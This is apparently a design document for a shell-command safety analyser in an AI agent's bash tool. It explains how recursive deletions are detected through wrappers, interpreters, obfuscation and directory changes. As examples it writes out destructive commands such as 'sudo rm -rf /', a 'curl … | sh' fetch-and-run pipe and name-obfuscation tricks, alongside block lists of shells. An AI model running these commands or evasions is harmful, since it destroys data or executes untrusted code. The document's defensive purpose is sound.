# Command analysis

How `ShellSafety` reads a command before it runs: shell detection, parsing, wrappers, interpreters, directory changes,
obfuscated command names, PowerShell parameter values, and the target rules it applies.

## Shell detection

`ShellSafety.kind(shell)` takes the shell path, uses its basename, strips a `.exe` suffix, and lowercases it.
`powershell` and `pwsh` map to `"powershell"`, `cmd` maps to `"cmd"`, and **everything else maps to `"bash"`**. The V2
bash tool passes the configured `shell`, falling back to `/bin/sh` on POSIX and `process.env.COMSPEC ?? "cmd.exe"` on
Windows.

## Parsing

bash and PowerShell command strings are parsed with tree-sitter WASM grammars — `tree-sitter-bash` and
`tree-sitter-powershell` — loaded lazily on first inspection. `inspectRoot` then walks every `command` node in the tree in
document order, so each command in a pipeline, list, or subshell is judged individually.

`cmd` has no grammar. `ShellSafety.parse` and `ShellSafety.inspectParsed` accept only `"bash" | "powershell"`, and a `cmd`
string is handled by a hand-written path that splits on unquoted `&`, `|`, `;`, and newlines and lexes each segment with a
regex. `cmd` analysis is correspondingly weaker than the parsed shells.

Anything the analyser cannot resolve statically is treated as a violation with `reason: "dynamic"` rather than allowed.
Within its scope the check fails closed.

## Wrappers

A naive "is the first word `rm`" check is defeated by `sudo rm -rf /`. Simply skipping leading words is defeated by
`sudo -u root rm -rf /`, where `root` is the value of `-u` and not the command. Both problems need the wrapper's own
option grammar.

`command()` peels wrappers with per-wrapper flag arity. `PREFIX` holds the wrappers for which every leading `-` token can
simply be skipped:

```
builtin  busybox  command  nohup  setsid  stdbuf
```

`exec`, `nice`, `timeout`, and `stdbuf` are matched before `PREFIX` and get bespoke handling, because a subset of their
flags (`-a`, `-n`, `-k`, `-s`, `--kill-after`, `--signal`, `-e`, `-i`, `-o`) consumes the next token. `sudo` and `doas`
use `SUDO_VALUE`, the set of sudo options that take a separate argument:

```
-C  -D  -g  -h  -p  -R  -r  -t  -T  -u  --chdir
```

`env` is handled separately because it can re-lex its own payload: `-S`, `-Sstring`, and `--split-string=` re-tokenize the
string and re-run the whole peel over the result, so `env -S 'rm -rf /'` and `env --split-string='rm -rf' ~` are seen as
the deletions they are.

## Interpreters

Peeling is not always safe. If the wrapper's arguments cannot be trusted to locate the interpreter's script argument, the
analyser refuses rather than guesses. `inspectParts` implements that with three sets. `WRAPPER_SCAN` is the set of first
tokens that trigger a forward scan:

```
builtin  busybox  command  doas  env  exec  nice  nohup  setsid  stdbuf  sudo  timeout
```

`WRAPPED_COMMAND` is what the scan looks for — the commands worth re-inspecting from that point. It is the POSIX and
Windows shell lists plus `find` and `rm`:

```
ash  bash  csh  dash  fish  ksh  mksh  sh  tcsh  zsh  cmd  powershell  pwsh  find  rm
```

`INTERPRETER` is the subset that is refused outright when reached through a wrapper, because its payload is a program
rather than an argument list. It is the same two shell lists:

```
ash  bash  csh  dash  fish  ksh  mksh  sh  tcsh  zsh  cmd  powershell  pwsh
```

Both derive from `POSIX_SHELL` and `WINDOWS_SHELL` in `packages/core/src/shell-safety.ts`. A new POSIX shell added there
also reaches `nested()`, which builds its bash set from `POSIX_SHELL`. Two lists are separate: `nested()` hard-codes
`powershell`, `pwsh`, and `cmd`, and its `xargs` branch only descends into `bash`, `dash`, `sh`, `zsh`, `powershell`,
and `pwsh`, so `xargs fish -c …` or `xargs ksh -c …` is not inspected.

So `env -P /bin sh -c 'rm -rf "$HOME"'` and `sudo --user root sh -c 'rm -rf "$HOME"'` are refused as
`target: "dynamic evaluator input"`.

Interpreters reached directly are handled by `nested()`, which extracts the payload from `bash -c`, `sh -c`, `eval`,
`powershell -Command`, `pwsh -Command`, `cmd /c`, `cmd /k`, `Invoke-Expression`/`iex`, and `xargs … sh`, then recursively
inspects that string. If the payload is not statically knowable — it contains `$`, a backtick, `%VAR%`, `!VAR!`, a
PowerShell splat, a parenthesised expression, `-EncodedCommand`, or `-Command -` reading from stdin — the command is
refused instead. An interpreter invoked with no recognizable payload flag at all (`sh script.sh`, or the `sh` at the end
of a pipeline) is likewise refused, which is why `curl https://example.com/x.sh | sh` is blocked.

Recursion is bounded: `inspectText` refuses at depth greater than 4 with `target: "nested dynamic input"`.

## Directory changes

Every path judgement is relative to one working directory. A command that changes directory first invalidates that
arithmetic, so the analyser tracks it and refuses any later recursive deletion rather than recomputing.

`CWD_COMMANDS` is the set that sets the flag while walking the parsed tree:

```
cd  chdir  popd  pushd  push-location  set-location
```

The same flag is set by `sudo -D` / `sudo --chdir` and by `env -C` / `env --chdir` during wrapper peeling, and by `cd`,
`chdir`, `popd`, and `pushd` in the `cmd` path. Once set it stays set for the rest of the command string, and a later
recursive deletion is reported as `target: "target after a directory change"`. `cd .. && rm -rf project` and
`Set-Location ..; Remove-Item -Recurse -Force project` are both blocked.

## Command-name obfuscation

Command names are normalized before comparison: surrounding quotes are removed, inner `'…'` and `"…"` pairs are unwrapped,
escape characters are collapsed, the basename is taken, a `.exe` suffix is stripped, and the result is lowercased. Which
escapes are collapsed depends on the shell — backslash and `^` for the POSIX form, `^` and backtick for the Windows form.
That makes `r''m`, `s''h`, `/bin/rm`, `r^d`, and `C:\Windows\System32\cmd.exe` resolve to `rm`, `sh`, `rm`, `rd`, and
`cmd`. PowerShell tokens have their backtick escapes stripped separately, so `Remove-It` + backtick + `em` and
`-Recur` + backtick + `se` are recognized. A command name that is itself dynamic — a substitution, an expansion, a glob,
or a brace expression — combined with recursive flags is refused.

## PowerShell parameter values

`targets()` treats any non-flag token as a deletion target. Without knowing which PowerShell parameters take a value, the
value would be misread as a target: in `Remove-Item -Recurse -Force -ErrorAction $mode ./dist`, `$mode` would look like a
dynamic target and the safe command would be blocked. `POWERSHELL_VALUE_PARAMETERS` lists the common parameters that
consume the following token:

```
-credential  -erroraction  -errorvariable  -exclude  -filter  -include  -informationaction
-informationvariable  -outbuffer  -outvariable  -pipelinevariable  -progressaction  -stream
-warningaction  -warningvariable
```

`POWERSHELL_VALUE_ALIASES` covers their short forms:

```
-ea  -ev  -ia  -iv  -ob  -ov  -pv  -wa  -wv
```

Abbreviations of at least five characters including the leading hyphen are also accepted when they are an unambiguous
prefix of exactly one of those parameters, matching PowerShell's own prefix resolution.
`-LiteralPath` and `-LP` mark their value as literal so a bracketed directory name such as `'[cache]'` is not treated as a
wildcard.

## Target rules

Once a recursive deletion and its targets are identified, each target is judged by `violation()`. The reasons are:

| `reason`            | Meaning                                                                                 |
| ------------------- | --------------------------------------------------------------------------------------- |
| `root`              | A filesystem root: `/`, `//`, `C:\`, `\\server\share`, or a target that resolves to one |
| `home`              | `~`, `~name`, or a target that resolves to `os.homedir()`                               |
| `working-directory` | `.`, `~+`, or a target that resolves to the working directory itself                    |
| `parent-directory`  | Any `..` component, or a target that is an ancestor of the working directory            |
| `wildcard`          | An unquoted `*`, `?`, `[`, `]`, `{`, or `}` in the target                               |
| `dynamic`           | Anything that cannot be resolved statically, and anything that is not a direct child    |

`dynamic` is the catch-all and covers substitutions and variables (`$`, backtick, `%VAR%`, `!VAR!`, PowerShell splats),
drive-relative Windows paths such as `C:..`, Windows components with a trailing space or dot (which the OS normalizes
away), absolute paths with a trailing separator or an embedded `.` component, multi-component relative paths, and every
target that survives the earlier checks but is not a direct child of the working directory, `os.tmpdir()`, or `/tmp`.

Quoted bash targets, single or double, are exempt from the wildcard and home checks, because the shell will not expand
`*` or `~` inside quotes: `rm -rf '*'` and `rm -rf "~"` refer to files literally named `*` and `~` and are allowed. Only
single-quoted targets also skip the variable check, since `$` still expands inside double quotes.
